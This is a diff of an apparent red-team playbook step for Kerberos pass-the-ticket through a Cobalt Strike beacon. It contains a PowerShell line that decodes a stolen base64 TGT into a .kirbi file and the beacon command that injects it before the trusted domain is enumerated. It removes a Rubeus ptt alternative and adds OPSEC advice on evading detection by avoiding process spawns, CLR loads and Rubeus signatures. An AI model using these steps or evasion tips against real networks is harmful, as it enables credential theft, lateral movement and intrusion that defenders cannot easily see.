@@ -161,31 +161,25 @@ Step 8:    Use TGT to enumerate CONTOSO via LDAP → find attack paths
 
     > Creates a new Type 9 logon session. The password is never validated over the network — it is a placeholder. The session exists purely to hold the injected ticket.
 
-    **Step 7b — Option A: Save base64 ticket to .kirbi then inject (required by `kerberos_ticket_use`):**
+    **Step 7b — Decode base64 ticket to .kirbi on attacker desktop:**
 
-    > `kerberos_ticket_use` expects a **file path to a `.kirbi` file** on the CS client (attacker desktop) — NOT a raw base64 string. Passing base64 directly causes the error: `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist`.
+    > **IMPORTANT:** `kerberos_ticket_use` expects a **file path to a `.kirbi` file** on the CS client (attacker desktop) — NOT a raw base64 string. Passing base64 directly causes the error: `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist`.
+    >
+    > `kerberos_ticket_use` is the **recommended method** — it uses CS's native ticket injection via Windows API. No process spawn, no CLR load, no Rubeus signatures. Rubeus `ptt` via `execute-assembly` is OPSEC-CAUTION (spawns a sacrificial process and loads the .NET CLR) — avoid it for pure ticket injection when `kerberos_ticket_use` is available.
 
-    On attacker desktop PowerShell — decode base64 to file:
+    On attacker desktop PowerShell — decode base64 to .kirbi file:
 
     ```powershell
     [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\partner.kirbi", [Convert]::FromBase64String("[BASE64_TGT]"))
     ```
 
-    Then in Cobalt Strike beacon:
+    Then inject via CS native command:
 
     ```Beacon-nocolor
     kerberos_ticket_use C:\Users\Attacker\Desktop\partner.kirbi
     ```
 
-    **Step 7b — Option B (simpler): Use Rubeus ptt — accepts base64 directly, no file needed:**
-
-    ```Beacon-nocolor
-    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
-    ```
-
-    > Rubeus `ptt` takes the base64 ticket inline. No intermediate file, no PowerShell decode step. Injects directly into the current beacon logon session. Use this in the sacrificial session created by `make_token` above.
-    >
-    > **OPSEC-SAFE** — Ticket injection is in-memory only. No disk write (Option B), no new process.
+    > **OPSEC-SAFE** — CS injects the ticket into the logon session via Windows Kerberos API. No process spawn, no CLR load, no disk write on the target. The `.kirbi` file lives only on the attacker desktop (CS client), never on the target machine.
 
 8. Enumerate the trusted domain.
 
